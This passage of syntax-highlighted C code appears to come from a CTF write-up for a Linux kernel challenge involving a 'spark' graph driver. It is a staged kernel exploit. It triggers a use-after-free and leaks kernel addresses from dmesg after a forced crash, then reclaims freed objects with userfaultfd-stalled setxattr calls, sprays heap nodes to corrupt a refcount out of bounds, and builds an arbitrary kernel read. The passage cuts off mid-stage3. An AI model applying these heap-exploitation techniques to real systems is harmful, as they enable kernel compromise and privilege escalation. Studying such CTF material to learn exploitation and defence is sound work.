class="hljs-number">-1</span>);<br>    g_create_next_id++;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">llink</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_LINK, b | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = a,<br>        .fd2 = b,<br>    &#125;;<br>    assert(ioctl(a, SPARK_QUERY, &amp;qry) == <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> qry.distance;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_FINALIZE) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, struct spark_info *info)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_INFO, info) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">release</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(close(a) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">sem_t</span> fault_sem;<br>    <span class="hljs-keyword">sem_t</span> unblock_sem;<br>    <span class="hljs-keyword">void</span> *addr;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">fault_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> *<span class="hljs-title">param</span> =</span> (struct fault_arg *)arg;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *page = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(page != MAP_FAILED);<br>    page[<span class="hljs-number">0</span>] = <span class="hljs-number">0xff</span>; <span class="hljs-comment">// top byte for traversal addr</span><br><br>    <span class="hljs-comment">// create a userfaultfd object</span><br>    <span class="hljs-keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    assert(uffd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-comment">// enable the userfaultfd object</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// n_addr is the start of where you want to catch the pagefault. In our</span><br>    <span class="hljs-comment">// case, we set it to the address of page 2</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)param-&gt;addr;<br>    uffdio_register.range.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    assert(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">0</span>);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-keyword">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    assert(nready != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    assert(read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) == <span class="hljs-keyword">sizeof</span>(msg));<br>    assert(msg.event == UFFD_EVENT_PAGEFAULT);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// wait until reclaim_free is called. but in stage1 it doesn&#x27;t exist.</span><br>    assert(sem_wait(&amp;param-&gt;unblock_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)page;<br>    uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)msg.arg.pagefault.address &amp; ~<span class="hljs-number">0xfff</span>UL;<br>    uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">0</span>);<br><br>    close(uffd);<br>    munmap(page, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">setxattr_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> *<span class="hljs-title">param</span> =</span> (struct setxattr_arg *)arg;<br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, param-&gt;buf, param-&gt;size, XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> <span class="hljs-title">fault_arg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> <span class="hljs-title">setxattr_arg</span>;</span><br>    <span class="hljs-keyword">pthread_t</span> setxattr_handle;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc_raw</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">char</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *mem = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(mem != MAP_FAILED);<br><br>    ctx-&gt;fault_arg.addr = mem + <span class="hljs-number">0x1000</span>;<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.fault_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.unblock_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">pthread_t</span> handle;<br>    assert(pthread_create(&amp;handle, <span class="hljs-literal">NULL</span>, fault_thread, &amp;ctx-&gt;fault_arg) == <span class="hljs-number">0</span>);<br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">char</span> *node = mem + <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x7e</span>;<br>    <span class="hljs-comment">// memcpy could cross boundaries</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x7e</span>; i++)<br>        node[i] = buf[i];<br><br>    ctx-&gt;setxattr_arg.buf = node;<br>    ctx-&gt;setxattr_arg.size = <span class="hljs-number">0x7f</span>; <span class="hljs-comment">// avoid copy_from_user 16b optimization</span><br>    assert(pthread_create(&amp;ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>, setxattr_thread, &amp;ctx-&gt;setxattr_arg) == <span class="hljs-number">0</span>);<br><br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_finalized,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;               <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = is_finalized;   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x58</span>) = num_children;  <span class="hljs-comment">// num_children</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x70</span>) = traversal_idx; <span class="hljs-comment">// traversal_idx</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = traversal;     <span class="hljs-comment">// traversal</span><br><br>    reclaim_alloc_raw(ctx, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_free</span><span class="hljs-params">(struct reclaim_ctx *ctx)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(sem_post(&amp;ctx-&gt;fault_arg.unblock_sem) == <span class="hljs-number">0</span>);<br>    assert(pthread_join(ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1_leak_dmesg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *edges_addrp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br><br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br><br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr = <span class="hljs-number">0</span>, edges_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!dist_addr || !edges_addr); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!dist_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RAX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;dist_addr) != <span class="hljs-number">1</span>)<br>                dist_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!edges_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;R09: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;edges_addr) != <span class="hljs-number">1</span>)<br>                edges_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(dist_addr &amp;&amp; edges_addr);<br><br>    <span class="hljs-built_in">free</span>(buf);<br><br>    *dist_addrp = dist_addr;<br>    *edges_addrp = edges_addr;<br>&#125;<br><br><span class="hljs-comment">// resulting size should be in a rarely used cache</span><br><span class="hljs-comment">// this is supposed to be arbitrary but if you change it you&#x27;ll mess up stage 3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S1_DIST_NUM_NODES 12</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *node_addrp, <span class="hljs-keyword">int</span> *node_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Freeing node\n&quot;</span>);<br>    release(fds[S1_DIST_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">//*the crashed process will stop execute, so create a new thread here.</span><br>    <span class="hljs-keyword">pid_t</span> pid = fork();<br>    assert(pid != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//*chlid process</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Reclaiming node\n&quot;</span>);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">ctx</span>;</span><br>        <span class="hljs-comment">//*finalized the last node, avoid the revise of the next finalize</span><br>        reclaim_alloc(&amp;ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x4141000000000000</span>UL, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Finalizing root\n&quot;</span>);<br>        finalize(fds[<span class="hljs-number">0</span>]);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Performing crash query by UAF\n&quot;</span>);<br>        query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// Will never get here</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    usleep(<span class="hljs-number">250</span> * <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Leaking from dmesg\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr, edges_addr;<br>    stage1_leak_dmesg(&amp;dist_addr, &amp;edges_addr);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> node_addr = edges_addr - <span class="hljs-number">0x60</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Dist @ 0x%lx\n&quot;</span>, dist_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Node @ 0x%lx\n&quot;</span>, node_addr);<br><br>    *dist_addrp = dist_addr;<br>    *node_addrp = node_addr;<br>    *node_fdp = fds[<span class="hljs-number">0</span>];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE1_NUM_NODES</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2_spray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd, <span class="hljs-keyword">int</span> before, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> skip, <span class="hljs-keyword">int</span> after)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; before; i++)<br>        create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        fd[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i += skip)<br>    &#123;<br>        release(fd[i]);<br>        fd[i] = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; after; i++)<br>        create();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2</span><span class="hljs-params">(struct reclaim_ctx *victim_ctx, <span class="hljs-keyword">int</span> *victim_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//*errrrrrr, dist array size will be 8b less than STAGE2_NUM_NODES*8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_NUM_NODES 17 <span class="hljs-comment">// dist array size == 0x80 == sizeof node</span></span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[STAGE2_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>); <span class="hljs-comment">// 1 will be written at traversal_idx</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing node\n&quot;</span>);<br>    release(fds[STAGE2_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming node\n&quot;</span>);<br>    <span class="hljs-comment">//*the idx is 17</span><br>    reclaim_alloc(victim_ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) / <span class="hljs-number">8</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// target: sprayed refcount</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Finalizing root\n&quot;</span>);<br>    <span class="hljs-comment">//*now fds[0] have children in different traversals. the last and the others.</span><br>    finalize(fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating predecessor\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_incref_fd = create();<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_SPRAY_NUM 200</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Spraying nodes\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_fd[STAGE2_SPRAY_NUM];<br>    stage2_spray(spray_fd, <span class="hljs-number">30</span>, STAGE2_SPRAY_NUM, <span class="hljs-number">4</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Incrementing sprayed refcounts\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>            llink(spray_incref_fd, spray_fd[i], <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//*above ops create gaps in size of struct_node for dis_arr</span><br>    <span class="hljs-comment">//*next line there is nothing special</span><br>    finalize(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Corrupting refcount\n&quot;</span>);<br>    <span class="hljs-comment">//*use the OOB to corrupt the dis_arr&#x27;s adjacent node struct.</span><br>    query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*release the root, but only the node whose refcount has been modified will be freed</span><br>    <span class="hljs-comment">//*and all fds except for root retain the same as before.</span><br>    release(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming victim node\n&quot;</span>);<br>    reclaim_free(victim_ctx); <span class="hljs-comment">// unblock fault</span><br>                              <span class="hljs-comment">// ephemeral alloc to put two 0xff at the end for traversal top bytes</span><br>                              <span class="hljs-comment">//*these two bytes are in next uffd page</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>] = <span class="hljs-number">0xff</span>;<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">2</span>] = <span class="hljs-number">0xff</span>;<br>    <span class="hljs-comment">//*now there are serveral gaps in size of node_t, which one will be chosed?</span><br>    <span class="hljs-comment">//*good luck. at least the following two lines will use the same chunk.</span><br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, buf, <span class="hljs-keyword">sizeof</span>(buf), XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    reclaim_alloc(victim_ctx, <span class="hljs-number">0</span>, <span class="hljs-number">1337</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Searching for victim node(fd)\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> victim_fd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span> =</span> &#123;<br>                .num_children = <span class="hljs-number">0</span>,<br>            &#125;;<br>            get_info(spray_fd[i], &amp;info);<br>            <span class="hljs-keyword">if</span> (info.num_children == <span class="hljs-number">1337</span>)<br>            &#123;<br>                victim_fd = spray_fd[i];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//*indeed, this totally depends on luck...</span><br>    assert(victim_fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Victim fd = %d\n&quot;</span>, victim_fd);<br>    *victim_fdp = victim_fd;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_NUM_NODES</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE3_READ_NUM_CHILDREN 0x4142133703030303</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">stage3_read</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    reclaim_free(ctx);<br>    <span class="hljs-comment">// during read, we keep a special num_children so we can find ourselves</span><br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, STAGE3_READ_NUM_CHILDREN, <span class="hljs-number">0</span>, addr);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span>;</span><br>    get_info(fd, &amp;info);<br>    <span class="hljs-keyword">return</span> info.traversal_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage3</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> *scratch_fds, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr,</span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_node_addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Finding victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*.......nb</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> victim_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">6000</span>; i &lt; <span 